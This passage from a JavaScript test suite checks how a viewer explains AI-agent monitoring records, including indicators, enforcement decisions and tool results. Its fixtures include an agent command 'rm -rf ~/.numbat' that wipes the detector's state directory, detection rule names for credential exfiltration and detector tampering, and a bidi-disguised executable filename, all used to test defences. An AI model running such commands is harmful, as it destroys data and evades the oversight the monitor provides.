     /does not show that a connection was made/.test(lim), lim);
  ok("an indicator denies establishing a transmission or a file",
     /sent|present/.test(lim), lim);

  // Type is assigned by shape. For two of the five types in this corpus the
  // shape is actively misleading, so the pane says so.
  ok("sha1 warns that a git commit hash has the same shape",
     /git commit hash/.test(ex({ type:"sha1", value:"ce0914a8b1ff347a5bb44894d01ac8e847872e7e", count:1 }).limits.join(" ")));
  ok("email warns that an SSH remote has the same shape",
     /SSH remote/.test(ex({ type:"email", value:"git@github.com", count:1 }).limits.join(" ")));
  ok("a domain gets no shape caveat it does not need",
     !/git commit|SSH remote/.test(ex({ type:"domain", value:"x.com", count:1 }).limits.join(" ")));

  // Indicators carry no session_id, only sample_session_id, so they never
  // appear in a session rollup or a session: filter. Say so rather than
  // letting the operator conclude the tool lost them.
  ok("an indicator explains why session filters miss it",
     /no session_id/.test(lim), lim);

  // The sample link.
  eq("an indicator points at its sample occurrence", e.next.label, "Where it was seen");
  eq("the sample event is offered as a link", e.next.eventId, "s1");
  ok("a single occurrence is stated as one", /one occurrence/.test(e.next.text), e.next.text);

  var many = ex({ type:"url", value:"https://x/y", count:7, sample_event_id:"s2" });
  ok("a repeated indicator reports its count", /7/.test(many.next.text), many.next.text);
  ok("a repeated indicator says the link is only a sample",
     /not all of them/.test(many.next.text), many.next.text);
  // count is per-RUN: 106 indicator records in the reference corpus carry only
  // 24 distinct values, one of them across 16 separate records each saying 1.
  ok("a repeated indicator scopes its count to the run",
     /tally for the run this record covers, not for this file/.test(many.limits.join(" ")),
     many.limits.join(" | "));
  ok("the run scoping is present on a count of one too — the common path",
     /tally for the run this record covers/.test(e.limits.join(" ")), e.limits.join(" | "));
  ok("a count of one is scoped to the run, not stated as a total",
     /counted one occurrence in the run this record covers/.test(e.next.text), e.next.text);

  var nolink = ex({ type:"domain", value:"x.com", count:1 });
  ok("an indicator with no sample says so rather than inventing a link",
     nolink.next !== null && /names no sample event/.test(nolink.next.text), JSON.stringify(nolink.next));
  eq("an indicator with no sample offers no link", nolink.next.eventId, "");

  // Degenerate shapes.
  ok("an indicator with only record_type still explains itself",
     !!explain({ record_type:"indicator" }, NOIDX).what);
  ok("an all-null indicator still explains itself",
     !!explain({ record_type:"indicator", type:null, value:null, count:null,
                 sample_event_id:null, first_seen:null, last_seen:null }, NOIDX).what);
  ok("an indicator with no type makes no shape claim",
     !/git commit|SSH remote/.test(explain({ record_type:"indicator", value:"x" }, NOIDX).limits.join(" ")));
})();

/* — enforcement records ────────────────────────────────────────────────────
   Only 9, and they carry no severity, no title and no command — so without
   their linked finding they can say almost nothing. All 9 in the corpus are
   decision "no_override", mode "monitor", reason "monitor_mode", each naming
   exactly one rule, one finding and one action event, all of which resolve.  */
(function(){
  function enf(o){ o.record_type = "enforcement"; return o; }

  var finding = { record_type:"finding", finding_id:"fnd-1",
                  rule_id:"tamper.detector_state_write", severity:"high",
                  title:"Agent targeted numbat's default state directory",
                  cited_event_ids:["ev-1"] };
  var action  = { record_type:"event", event_type:"command.exec", event_id:"ev-1",
                  tool_call_id:"tc1", command:"rm -rf ~/.numbat" };
  var rec = enf({ decision:"no_override", mode:"monitor", reason:"monitor_mode",
                  rule_ids:["tamper.detector_state_write"], finding_ids:["fnd-1"],
                  action_event_ids:["ev-1"], tool_name:"Bash",
                  decision_id:"enf-1", source_type:"hook" });
  var idx = buildIndex([rec, finding, action]);
  var e = explain(rec, idx);

  ok("an enforcement is explained at all", !!(e && e.what && e.what.length), JSON.stringify(e));
  // "did not override" is the schema token no_override wearing English;
  // describe() says "Did not intervene" for the same record one line above.
  ok("no_override is stated in the same words describe() uses",
     /decision not to intervene/.test(e.what), e.what);
  ok("the schema token does not leak into the prose", !/override/.test(e.what), e.what);
  ok("the headline names the mode it was running in", /monitor/.test(e.what), e.what);

  // The whole point: an enforcement borrows its substance from its finding.
  eq("the linked finding is resolved", e.findings.length, 1);
  eq("the finding's rule is carried over", e.findings[0].rule, "tamper.detector_state_write");
  eq("the finding's severity is carried over", e.findings[0].sev, "high");
  eq("the finding's title is carried over", e.findings[0].title,
     "Agent targeted numbat's default state directory");
  ok("the findings section is labelled for a decision, not for an event",
     /decision/.test(e.findingsNote || ""), e.findingsNote);
  ok("the findings label claims reference, not action",
     /references/.test(e.findingsNote || "") && !/acted on/.test(e.findingsNote || ""), e.findingsNote);

  // Severity is not the enforcement's own, and saying so prevents the reader
  // attributing the finding's rating to numbat's decision.
  ok("borrowed severity is marked as borrowed",
     /carries no severity of its own/.test(e.limits.join(" ")), e.limits.join(" | "));

  // "acted on" claims action, on a record whose own caveat says it could not
  // have stopped anything.
  eq("the action is linked under a label that claims no action", e.next.label, "What it applies to");
  eq("the action event is offered as a link", e.next.eventId, "ev-1");
  ok("one action is stated as one", /one recorded action/.test(e.next.text), e.next.text);

  // Monitor mode is the difference between "chose not to act" and "could not".
  ok("monitor mode says the decision could not have blocked anything",
     /could not have stopped/.test(e.limits.join(" ")), e.limits.join(" | "));
  ok("an enforcement denies establishing what happened next",
     /does not show what the agent did next/.test(e.limits.join(" ")), e.limits.join(" | "));

  // reason "monitor_mode" restates mode "monitor"; do not print it twice.
  ok("a reason that merely restates the mode is not repeated",
     (e.limits.join(" ").match(/monitor/g) || []).length <= 2, e.limits.join(" | "));

  // Other decisions.
  function what(o){ return explain(enf(o), NOIDX).what; }
  ok("a deny decision is stated as a block", /blocked/.test(what({ decision:"deny" })), what({ decision:"deny" }));
  ok("an allow decision is stated as allowed", /allowed/.test(what({ decision:"allow" })), what({ decision:"allow" }));
  ok("an unrecognised decision is quoted rather than guessed at",
     /“escalate”/.test(what({ decision:"escalate" })), what({ decision:"escalate" }));
  ok("a decision-less enforcement still explains itself", !!what({}).length);

  // An unresolvable finding must still be named, not silently dropped.
  var orphan = enf({ decision:"deny", finding_ids:["fnd-missing"], action_event_ids:[] });
  var oe = explain(orphan, buildIndex([orphan]));
  eq("an unresolved finding is still listed", oe.findings.length, 1);
  eq("an unresolved finding is named by its id", oe.findings[0].finding, "fnd-missing");
  ok("an unresolved finding claims no severity", !oe.findings[0].sev, JSON.stringify(oe.findings[0]));
  ok("no action events says so rather than inventing one",
     /names no action event/.test(oe.next.text), oe.next.text);

  // Several actions.
  var multi = enf({ decision:"deny", action_event_ids:["a1","a2","a3"] });
  var me = explain(multi, buildIndex([multi]));
  ok("several actions are counted", /3 recorded actions/.test(me.next.text), me.next.text);

  ok("an enforcement with only record_type still explains itself",
     !!explain({ record_type:"enforcement" }, NOIDX).what);
  ok("an all-null enforcement still explains itself",
     !!explain({ record_type:"enforcement", decision:null, mode:null, reason:null,
                 rule_ids:null, finding_ids:null, action_event_ids:null }, NOIDX).what);
  ok("a malformed finding_ids list does not throw",
     !!explain({ record_type:"enforcement", finding_ids:"nope" }, NOIDX).what);
})();

/* — tool.result: no constant sentence, and no restatement of the row ────────
   Two failure modes bound this, and 0.6.0 and 0.7.0 each hit one of them.

   Remove the trailing sentence and the headline becomes "The Edit tool
   returned." — byte-identical to describe()'s row summary on every one of the
   1,366 tool.result records in the reference corpus, which is what 0.6.0 was
   fixing when it added the sentence.

   Keep the sentence and it fires on 100% of them, because a tool.result
   carries no payload field ever — not content_preview, not command, not
   file_path, on any of the 1,366. That makes it a fact about the event TYPE,
   not about the record, and CLAUDE.md forbids spending per-record space on one.

   The way out is that a tool.result's counterpart carries a target it does
   not: 1,274 of 1,366 pair with a file.read/file.write naming a path. That is
   information describe() cannot have — it is pure over a single record — so
   the headline can carry it without restating anything. The absence of a
   payload moves to the slot where the payload would have been.               */
(function(){
  function pairFor(callType, tool, path, tsA, tsB){
    var call = exEv({ event_type:callType, event_id:"c1", tool_call_id:"tt",
                      tool_name:tool, file_path:path, timestamp:tsA });
    var res  = exEv({ event_type:"tool.result", event_id:"c2", tool_call_id:"tt",
                      tool_name:tool, timestamp:tsB });
    return { call:call, res:res, idx:buildIndex([call, res]) };
  }
  var T0 = "2026-07-31T18:00:00.000Z", T1 = "2026-07-31T18:00:00.128Z";

  var P = pairFor("file.write", "Edit", "/a/b.js", T0, T1);
  var e = explain(P.res, P.idx);
  eq("the headline names the target and how long the call was outstanding",
     e.what, "The Edit tool returned, called on /a/b.js. The call was recorded 128 ms earlier.");

  // The invariant, asserted directly rather than by matching a string.
  ok("the headline is not the row summary reworded",
     e.what.replace(/[.\s]/g,"") !== describe(P.res).replace(/[.\s]/g,""),
     describe(P.res) + "  vs  " + e.what);
  var all = [e.what].concat(e.next?[e.next.text]:[]).concat(e.limits).join(" ");
  ok("no sentence claims what the record does not carry",
     !/does not carry what was returned/.test(all), all);
  ok("the pairing section no longer repeats the target",
     !/It targeted/.test(e.next.text), e.next.text);

  /* Long paths elide the MIDDLE, keeping the filename. Tail truncation kept
     120 characters of worktree prefix and destroyed the identifying segment —
     and tool.result is the one pane with no OBSERVED fallback and no file_path
     in its own JSON, so a lost filename was unrecoverable. */
  (function(){
    var deep = "/Users/x/.superset/worktrees/8635b301-bd9e-4456-aa67-78f676170d23/" +
               "admin-pages-bug-audit/sh-dashboard/src/app/api/v1/portal/contacts/" +
               "__tests__/viewer-write.test.js";
    var L = pairFor("file.write", "Write", deep, T0, T1);
    var lw = explain(L.res, L.idx).what;
    ok("a long target keeps its filename", /viewer-write\.test\.js/.test(lw), lw);
    ok("a long target drops the prefix instead", /…\//.test(lw), lw);
    ok("the headline stays a readable length", lw.length < 130, lw.length + ": " + lw);
    // the same elision describe() uses, so the row and the pane agree
    ok("path elision matches describe()'s",
       /…\/__tests__\/viewer-write\.test\.js/.test(lw) &&
       /…\/__tests__\/viewer-write\.test\.js/.test(describe(L.call)), lw);
  })();

  // 92 of 1,366 answer a pathless tool.call. Elapsed time gives them something
  // to say instead of restating the section directly below them.
  var Q = pairFor("tool.call", "Agent", null, T0, "2026-07-31T18:17:14.000Z");
  var qe = explain(Q.res, Q.idx);
  eq("a targetless result reports how long its call was outstanding",
     qe.what, "The Agent tool returned. The call was recorded 17 min 14 s earlier.");
  ok("a targetless result does not restate the section below it",
     !/answering a tool\.call/.test(qe.what), qe.what);
  ok("a targetless result is still not the row summary reworded",
     qe.what.replace(/[.\s]/g,"") !== describe(Q.res).replace(/[.\s]/g,""),
     describe(Q.res) + "  vs  " + qe.what);

  /* A guessed pair must not be stated with confidence in the line the eye lands
     on. Concatenating the reference corpus with itself — two overlapping
     exports — makes every one of its tool_call_id groups ambiguous. */
  (function(){
    var c1 = exEv({ event_type:"file.read", event_id:"x1", tool_call_id:"tz",
                    tool_name:"Read", file_path:"/real/one.js", timestamp:T0 });
    var c2 = exEv({ event_type:"file.read", event_id:"x2", tool_call_id:"tz",
                    tool_name:"Read", file_path:"/decoy/two.js", timestamp:T0 });
    var rr = exEv({ event_type:"tool.result", event_id:"x3", tool_call_id:"tz",
                    tool_name:"Read", timestamp:T1 });
    var a = explain(rr, buildIndex([c1, c2, rr]));
    ok("an ambiguous pair is not given a confident target",
       !/one\.js|two\.js/.test(a.what), a.what);
    ok("an ambiguous pair says so in the headline",
       /cannot be determined from this file/.test(a.what), a.what);
    ok("the headline and the pairing section agree about the ambiguity",
       /cannot be determined/.test(a.what) && /cannot be determined/.test(a.next.text),
       a.what + " || " + a.next.text);
    ok("an ambiguous pair claims no elapsed time either",
       !/earlier/.test(a.what), a.what);
  })();

  // exPairOf falls back to the first other record when no call-side type is
  // present. A tool.result does not answer a tool.result.
  (function(){
    var other = exEv({ event_type:"tool.result", event_id:"y1", tool_call_id:"ty",
                       tool_name:"Read", file_path:"/decoy/path.js" });
    var self  = exEv({ event_type:"tool.result", event_id:"y2", tool_call_id:"ty", tool_name:"Read" });
    var ne = explain(self, buildIndex([other, self]));
    ok("a non-call mate never supplies the target",
       !/decoy/.test(ne.what), ne.what);
    var ms = exEv({ event_type:"message.assistant", event_id:"y3", tool_call_id:"tw" });
    var r2 = exEv({ event_type:"tool.result", event_id:"y4", tool_call_id:"tw", tool_name:"Read" });
    ok("a message.assistant mate is not described as the call it answers",
       !/message\.assistant/.test(explain(r2, buildIndex([ms, r2])).what),
       explain(r2, buildIndex([ms, r2])).what);
  })();

  /* The tool name is the call's, so it comes from the mate — but then a single
     planted record could hand a result an attacker-chosen tool and path, and
     the row above ("The Bash tool returned") would disagree with the headline
     silently. When they disagree the pane describes a call no record describes,
     so it declines. 0 of 1,366 real pairs disagree. */
  (function(){
    var c = exEv({ event_type:"file.read", event_id:"m1", tool_call_id:"tm",
                   tool_name:"Read", file_path:"/etc/hosts", timestamp:T0 });
    var r = exEv({ event_type:"tool.result", event_id:"m2", tool_call_id:"tm",
                   tool_name:"Bash", timestamp:T1 });
    var me = explain(r, buildIndex([c, r])).what;
    ok("a tool-name disagreement is not resolved silently",
       !/\/etc\/hosts/.test(me), me);
    ok("a tool-name disagreement keeps the record's own tool",
       /The Bash tool/.test(me), me);
    ok("a tool-name disagreement says the pairing is undetermined",
       /cannot be determined/.test(me), me);
    // agreement is the normal case and still names the target
    var r2 = exEv({ event_type:"tool.result", event_id:"m3", tool_call_id:"tn",
                    tool_name:"Read", timestamp:T1 });
    var c2 = exEv({ event_type:"file.read", event_id:"m4", tool_call_id:"tn",
                    tool_name:"Read", file_path:"/etc/hosts", timestamp:T0 });
    ok("agreeing tool names still name the target",
       /\/etc\/hosts/.test(explain(r2, buildIndex([c2, r2])).what));
  })();

  /* A counterpart in a different session is not this record's counterpart.
     eventIndex() is built over every record in the file, never the filtered
     view, so without this a record planted in another session supplies the
     headline's target — and it survives narrowing to the victim's session. */
  (function(){
    var atk = exEv({ event_type:"file.read", event_id:"x-atk", tool_call_id:"tS",
                     tool_name:"Read", file_path:"/tmp/attacker-owned.txt",
                     session_id:"sess-ATTACKER", timestamp:T0 });
    var vic = exEv({ event_type:"tool.result", event_id:"x-vic", tool_call_id:"tS",
                     tool_name:"Read", session_id:"sess-VICTIM", timestamp:T1 });
    var xe = explain(vic, buildIndex([atk, vic]));
    ok("a cross-session record never supplies the target",
       !/attacker-owned/.test(xe.what), xe.what);
    ok("a cross-session record is not reported as the pair",
       !/A matching|result of a matching/.test(xe.next.text), xe.next.text);
    // same session still pairs
    var ok2 = exEv({ event_type:"file.read", event_id:"x-ok", tool_call_id:"tU",
                     tool_name:"Read", file_path:"/tmp/real.txt",
                     session_id:"sess-VICTIM", timestamp:T0 });
    var vic2 = exEv({ event_type:"tool.result", event_id:"x-v2", tool_call_id:"tU",
                      tool_name:"Read", session_id:"sess-VICTIM", timestamp:T1 });
    ok("a same-session record still pairs",
       /\/tmp\/real\.txt/.test(explain(vic2, buildIndex([ok2, vic2])).what));
  })();

  /* Bidi and zero-width characters survive into a headline that quotes another
     record's path. U+202E renders "/tmp/exe.png" for "/tmp/gnp.exe". */
  (function(){
    var c = exEv({ event_type:"file.read", event_id:"b1", tool_call_id:"tb",
                   tool_name:"Read", file_path:"/tmp/\u202Egnp.exe", timestamp:T0 });
    var r = exEv({ event_type:"tool.result", event_id:"b2", tool_call_id:"tb",
                   tool_name:"Read", timestamp:T1 });
    var bw = explain(r, buildIndex([c, r])).what;
    ok("a bidi override never reaches the headline", bw.indexOf("\u202E") === -1, JSON.stringify(bw));
    ok("a zero-width character never reaches the headline",
       !/[\u200B-\u200F\u2066-\u2069]/.test(
         explain(exEv({ event_type:"file.read", file_path:"/a/\u200Bb.js" }), NOIDX).what));
    ok("the visible path survives the strip", /gnp\.exe/.test(bw), bw);
    /* Tab, newline and CR are control characters too, and stripping them
       BEFORE the whitespace collapse joined the words either side. All four
       blocks render record text, so all four are checked. */
    eq("a newline still separates words in describe()",
       describe({ record_type:"event", event_type:"command.exec", command:"npm test\n--watch" }),
       "Proposed a shell command: npm test --watch");
    eq("a newline still separates words in explain()",
       explain(exEv({ event_type:"file.read", file_path:"/a\tb/c.js" }), NOIDX).what,
       "The agent asked to read /a b/c.js.");
    ok("a NUL still joins, because it is not whitespace",
       /ab/.test(describe({ record_type:"event", event_type:"command.exec", command:"a\u0000b" })));
  })();

  // The cap must bound the WORK, not only the output: exClean scanned a 40 MB
  // value before anything truncated it.
  (function(){
    var huge = new Array(4 * 1024 * 1024).join("x") + "/tail.js";
    var c = exEv({ event_type:"file.read", event_id:"h1", tool_call_id:"th",
                   tool_name:"Read", file_path:huge, timestamp:T0 });
    var r = exEv({ event_type:"tool.result", event_id:"h2", tool_call_id:"th",
                   tool_name:"Read", timestamp:T1 });
    var idx = buildIndex([c, r]);
    var t0 = Date.now(); var hw = explain(r, idx).what; var ms = Date.now() - t0;
    ok("a huge paired path does not dominate the render (" + ms + "ms)", ms < 120, ms + "ms");
    ok("a huge paired path still yields a bounded headline", hw.length < 200, hw.length);
    /* The timing above is a smoke test and passes even uncapped on a fast
       machine, so the invariant is asserted structurally too: every one of the
       four blocks bounds the input before it scans it. */
    eq("all four render blocks bound the input before scanning",
       (HTML.match(/length > 4096/g) || []).length, 4);
  })();

  /* subagent attribution was suppressed by a bare substring test against the
     rendered headline — a sub_agent of "a", "tool", or the mate's tool name
     matched almost anything, dropping the sentence that introduces the very
     subagent the next clause talks about. */
  (function(){
    ["a", "tool", "Read", "The"].forEach(function(nm){
      var c = exEv({ event_type:"file.read", event_id:"s1"+nm, tool_call_id:"ts"+nm,
                     tool_name:"Read", file_path:"/a/b.js", timestamp:T0 });
      var r = exEv({ event_type:"tool.result", event_id:"s2"+nm, tool_call_id:"ts"+nm,
                     tool_name:"Read", sub_agent:nm, timestamp:T1 });
      var lm = explain(r, buildIndex([c, r])).limits.join(" ");
      ok("sub_agent " + JSON.stringify(nm) + " is still introduced",
         /This record was produced by/.test(lm), lm);
    });
    // and a headline that DOES name the subagent must not introduce it twice
    var fr = explain(exEv({ event_type:"file.read", event_id:"s9", file_path:"/a/b.js",
                            sub_agent:"Explore" }), NOIDX).limits.join(" ");
    ok("a headline that names the subagent does not repeat the introduction",
       !/This record was produced by/.test(fr), fr);
  })();

  eq("a result with no pair at all still names the tool",
     explain(exEv({ event_type:"tool.result", event_id:"n1", tool_name:"Edit" }), NOIDX).what,
     "The Edit tool returned.");
  /* A result stamped BEFORE its call is a corrupt or clock-skewed file. The
     elapsed time is a subtraction of two record timestamps, so it must not be
     rendered negative — and it must not be rendered at all, because the
     ordering it implies is not what the records show. */
  (function(){
    var B = pairFor("file.read", "Read", "/a/b.js", "2026-07-31T18:00:05.000Z",
                                                   "2026-07-31T18:00:00.000Z");
    var bw = explain(B.res, B.idx).what;
    ok("a backwards pair claims no elapsed time", !/earlier/.test(bw), bw);
    ok("a backwards pair never renders a negative duration", !/-\d/.test(bw), bw);
    ok("a backwards pair still names the target", /\/a\/b\.js/.test(bw), bw);
  })();

  ok("a result whose timestamps do not parse claims no elapsed time",
     !/earlier/.test(explain(pairFor("file.read","Read","/a",  "nope","alsonope").res,
                             pairFor("file.read","Read","/a","nope","alsonope").idx).what));

  /* The regression guard: across a spread of shapes, no SENTENCE may appear in
     every explanation. Comparing whole sections let the old constant hide
     inside a string that varied for another reason. */
  (function(){
    var shapes = [
      pairFor("file.write", "Edit",  "/a/b.js", T0, T1),
      pairFor("file.read",  "Read",  "/c/d.md", T0, T1),
      pairFor("file.write", "Write", "/e/f.txt", T0, T1),
      pairFor("tool.call",  "Agent", null, T0, T1),
      pairFor("tool.call",  "Skill", null, T0, T1)
    ];
    var lone = exEv({ event_type:"tool.result", event_id:"z", tool_call_id:"zz", tool_name:"Read" });
    var sets = shapes.map(function(x){
      var r = explain(x.res, x.idx);
      return [r.what].concat(r.next?[r.next.text]:[]).concat(r.limits);
    });
    sets.push((function(){ var r = explain(lone, buildIndex([lone]));
      return [r.what].concat(r.next?[r.next.text]:[]).concat(r.limits); })());

    function sentences(arr){
      var out = [];
      arr.forEach(function(sec){
        String(sec).split(/(?<=[.;])\s+/).forEach(function(t){ t=t.trim(); if(t) out.push(t); });
      });
      return out;
    }
    var sentSets = sets.map(sentences);
    var everywhere = sentSets[0].filter(function(sent){
      return sentSets.every(function(set){ return set.indexOf(sent) !== -1; });
    });
    ok("no sentence is present on every tool.result explanation",
       everywhere.length === 0, JSON.stringify(everywhere));
    var heads = sets.map(function(s2){ return s2[0]; });
    ok("tool.result headlines vary across shapes",
       new Set(heads).size === heads.length, JSON.stringify(heads));
  })();

  /* The absence lives in the render layer, so these check the gate and the
     wording, not merely that the words exist somewhere. */
  (function(){
    ok("the payload slot is a plain line, not the record-content box",
       /NOPAYLOAD\[r\.etype\][\s\S]{0,200}?class="ruline"/.test(HTML) ||
       /np\.txt/.test(HTML) && !/np\.txt[\s\S]{0,80}class="cmd/.test(HTML));
    ok("the placeholder is reachable — gated on the absence, not dead code",
       /!cmd && r\.rt === "event" && typeof o\.event_type === "string" &&/.test(HTML) &&
       /hasOwnProperty\.call\(NOPAYLOAD, o\.event_type\)/.test(HTML));
    /* An absence claim may only be made about a record this viewer has looked
       all the way through. The observed cascade knows eight field names; a
       payload under any other — output, result, stdout, text — rendered "not
       captured" with the content in the JSON inches below. */
    ok("the absence claim is withheld when the record carries an unknown field",
       /hasOwnProperty\.call\(META_FIELDS, pk\)/.test(HTML) && /np = null; break;/.test(HTML),
       "unrecognised fields must suppress the no-payload claim");
    ok("the metadata allowlist is declared", /var META_FIELDS = \{\};/.test(HTML));
    ok("an array event_type cannot reach the gate by String() coercion",
       /typeof o\.event_type === "string"/.test(HTML));
    var m = HTML.match(/var NOPAYLOAD = \{([\s\S]*?)\n  \};/);
    ok("the no-payload table is declared once, outside showDetail", m !== null);
    var keys = (m ? m[1].match(/"([a-z.]+)":\s*\{/g) || [] : [])
                 .map(function(k){ return k.replace(/"|:\s*\{/g,""); }).sort();
    eq("only types that genuinely carry no payload are listed",
       keys.join(","), "message.assistant,tool.result");
    /* Each type gets its own wording. One shared string described a call that
       returned — false of every message.assistant, which answers no call. */
    ok("the two types do not share a sentence",
       m && m[1].indexOf("the agent sent a message") !== -1 &&
            m[1].indexOf("a call completed") !== -1, m && m[1]);
    ok("the message wording says nothing about a call returning",
       m && !/not what it returned/.test(m[1].split("message text")[1] || ""), m && m[1]);
    // "returned" invites the reading that the call worked; this is the slot
    // that can deny it, and tool.result's own limits say nothing about outcome.
    ok("the output wording denies the outcome too", /not its content or its outcome/.test(HTML));
  })();
})();

/* — every headline that inlines a path elides it the same way — */
(function(){
  var deep = "/Users/x/.superset/worktrees/8635b301-bd9e-4456-aa67-78f676170d23/" +
             "admin-pages-bug-audit/sh-dashboard/src/app/api/v1/portal/contacts/" +
             "__tests__/viewer-write.test.js";
  [["file.read","read"],["file.write","write"]].forEach(function(t){
    var w = explain(exEv({ event_type:t[0], event_id:"p1", tool_call_id:"pp",
                           tool_name:"Read", file_path:deep }), NOIDX).what;
    ok(t[0]+" elides the middle of a long path", /…\//.test(w), w);
    ok(t[0]+" keeps the filename", /viewer-write\.test\.js/.test(w), w);
    ok(t[0]+" headline stays readable", w.length < 130, w.length+": "+w);
  });
  /* exPath and dsPath are duplicated across a marker boundary, so — as with
     the three duration functions — a table asserts they agree rather than a
     comment claiming they do. */
  (function(){
    // Lifted with their blocks so each keeps its own trunc/clean helpers —
    // which is the point: the two chains must agree end to end, not just the
    // two outer functions.
    var dsPath = loadBlock("describe", ["dsPath"]).dsPath;
    var exPath = loadBlock("explain",  ["exPath"]).exPath;
    [ "", "/", "a", "/a/b.js", "relative/path/file.txt", "/one/two/three/four.js",
      deep, deep + "/" + deep, "/" + new Array(300).join("z") + "/end.js",
      "no-slashes-at-all-but-quite-long-" + new Array(80).join("q"),
      "/a/\u200Bb.js", "/tmp/\u202Egnp.exe", "  /padded/path.js  ",
      "/trailing/slash/", "////", "/ünïcødé/pâth/文件.txt", null, undefined, 42, true
    ].forEach(function(v){
      eq("dsPath/exPath agree on " + JSON.stringify(String(v)).slice(0,42),
         exPath(v), dsPath(v));
    });
  })();
})();

/* — defects the cold reviewers found in the new panes — */
(function(){
  function enf(o){ o.record_type = "enforcement"; return o; }
  function ind(o){ o.record_type = "indicator"; return o; }

  // A refused join key is a limit of this viewer, not an absence from the
  // record. The event path already learned this; the enforcement path had not.
  var refused = enf({ decision:"deny", finding_ids:["F-EVIL WITH SPACE"],
                      action_event_ids:["E-ID WITH SPACE"], rule_ids:["r"] });
  var re = explain(refused, buildIndex([refused]));
  ok("a refused action id is reported as a viewer limit",
     /not in a form this viewer will match on/.test(re.next.text), re.next.text);
  ok("a refused action id does not claim the record named none",
     !/names no action event/.test(re.next.text), re.next.text);
  ok("a refused finding id is disclosed rather than silently dropped",
     /finding id is not in a form this viewer will match on/.test(re.limits.join(" ")),
     re.limits.join(" | "));

  // A decoy finding sharing an id must not silently choose the severity an
  // operator triages by.
  var decoy = { record_type:"finding", finding_id:"F-DUP", rule_id:"benign.rule",
                title:"nothing to see here", severity:"low" };
  var real  = { record_type:"finding", finding_id:"F-DUP", rule_id:"exfil.credentials",
                title:"credential exfiltration", severity:"critical" };
  var dupEnf = enf({ decision:"no_override", mode:"monitor", finding_ids:["F-DUP"],
                     action_event_ids:["E1"], rule_ids:["exfil.credentials"] });
  var de = explain(dupEnf, buildIndex([decoy, real, dupEnf]));
  ok("a duplicated finding id is flagged as ambiguous",
     /may belong to a different one/.test(de.limits.join(" ")), de.limits.join(" | "));
  ok("a unique finding id raises no ambiguity note",
     !/may belong to a different one/.test(
       explain(dupEnf, buildIndex([real, dupEnf])).limits.join(" ")));

  // Caps must be stated, not applied silently.
  var many = []; for(var i=0;i<300;i++) many.push("a"+i);
  var capped = explain(enf({ decision:"deny", action_event_ids:many, finding_ids:many }),
                       buildIndex([]));
  ok("a capped action list states the record's real count",
     /references 300 recorded actions/.test(capped.next.text), capped.next.text);
  ok("a capped action list says how many it listed",
     /lists the first \d+/.test(capped.next.text), capped.next.text);
  ok("a capped finding list says it is the first N of the record's total",
     /first \d+ of 300 findings/.test(capped.findingsNote), capped.findingsNote);

  // A decision that says "blocked" under a mode that cannot block is an
  // internally inconsistent record. Assert neither.
  var conflict = explain(enf({ decision:"block", mode:"monitor" }), NOIDX);
  ok("a block under monitor mode is reported as a disagreement",
     /decision and the mode disagree/.test(conflict.limits.join(" ")), conflict.limits.join(" | "));
  ok("a block under monitor mode does not also claim it could not have blocked",
     !/could not have stopped/.test(conflict.limits.join(" ")), conflict.limits.join(" | "));

  // "monitor_mode" and "monitor" are the same mode; matching exactly dropped
  // the most important caveat on the pane for a spelling variant.
  ok("a mode spelled monitor_mode still gets the non-blocking caveat",
     /could not have stopped/.test(explain(enf({ decision:"no_override", mode:"monitor_mode" }), NOIDX).limits.join(" ")));
  ok("a mode spelled monitor_mode is not rendered as 'monitor_mode mode'",
     !/monitor_mode mode/.test(explain(enf({ decision:"no_override", mode:"monitor_mode" }), NOIDX).what));

  // rule_ids[0] is not known to belong to the unresolved finding.
  var mixed = enf({ decision:"deny", finding_ids:["f1","fX"], rule_ids:["r.zzz"] });
  var mx = explain(mixed, buildIndex([{ record_type:"finding", finding_id:"f1", rule_id:"r.one" }, mixed]));
  ok("an unresolved finding is not pinned to an arbitrary rule id",
     !/r\.zzz/.test(mx.limits.join(" ")), mx.limits.join(" | "));
  ok("the unresolved count is still reported",
     /not in this file/.test(mx.limits.join(" ")), mx.limits.join(" | "));

  // The indicator quotes the text its value was matched in — and only when the
  // value is actually in it.
  var ev1 = { record_type:"event", event_type:"command.exec", event_id:"S1",
              command:"echo start && ssh -o ConnectTimeout=20 ubuntu@100.100.54.71 'deploy' && echo done" };
  var i1 = ind({ type:"ipv4", value:"100.100.54.71", count:1, sample_event_id:"S1" });
  var ie = explain(i1, buildIndex([ev1, i1]));
  ok("the indicator quotes the command it matched in", !!(ie.seen && ie.seen.text), JSON.stringify(ie.seen));
  ok("the quote contains the matched value", /100\.100\.54\.71/.test(ie.seen.text), ie.seen.text);
  ok("the quote is a slice, not the whole command", ie.seen.text.length < 300, ie.seen.text.length);
  ok("the quote names the event type it came from", ie.seen.from === "command.exec", ie.seen.from);

  var ev2 = { record_type:"event", event_type:"command.exec", event_id:"S2", command:"unrelated text" };
  var i2 = ind({ type:"ipv4", value:"10.0.0.1", count:1, sample_event_id:"S2" });
  ok("a value absent from its sample is not quoted from it",
     explain(i2, buildIndex([ev2, i2])).seen === null);

  // A template is not an address anything resolved.
  ok("an unexpanded variable marks the value as a template",
     /template that appeared in the text/.test(
       explain(ind({ type:"url", value:"https://api.supabase.com/v1/projects/$REF/query", count:1 }), NOIDX).limits.join(" ")));
  ok("a placeholder marks the value as a template",
     /template that appeared in the text/.test(
       explain(ind({ type:"url", value:"https://github.com/YOURNAME/x", count:1 }), NOIDX).limits.join(" ")));
  ok("a resolved value gets no template caveat",
     !/template/.test(explain(ind({ type:"domain", value:"api.supabase.com", count:1 }), NOIDX).limits.join(" ")));

  // The email counter-example must not be the record's own value.
  var self = explain(ind({ type:"email", value:"git@github.com", count:1 }), NOIDX).limits.join(" ");
  ok("the email caveat does not cite the record's own value as the counter-example",
     /this one is an SSH remote/.test(self), self);

  // count validation
  eq("a fractional count is not rendered as occurrences",
     /occurrences/.test(explain(ind({ type:"url", value:"x", count:2.5, sample_event_id:"S1" }),
                                buildIndex([ev1])).next.text), false);
  ok("a zero count is not reported as unknown",
     /counts no occurrences/.test(explain(ind({ type:"url", value:"x", count:0, sample_event_id:"S1" }),
                                          buildIndex([ev1])).next.text));
})();

/* — render-layer defects the cold reviewers found — */
(function(){
  ok("the session return is gated on the record being in that session",
     /r\.sid !== loneSid/.test(HTML),
     "an indicator carries no session_id and must not be offered a rollup that excludes it");
  // A 64 MB indicator value cost ~3.9 s per selection and re-ran on every
  // arrow-key press past the record. Asserting the constant merely EXISTS
  // would pass with the bound set to 1e12.
  (function(){
    var m = HTML.match(/OBSCAP\s*=\s*(\d+)/);
    ok("the observed block declares a cap", m !== null);
    ok("the observed cap is small enough to bound a render",
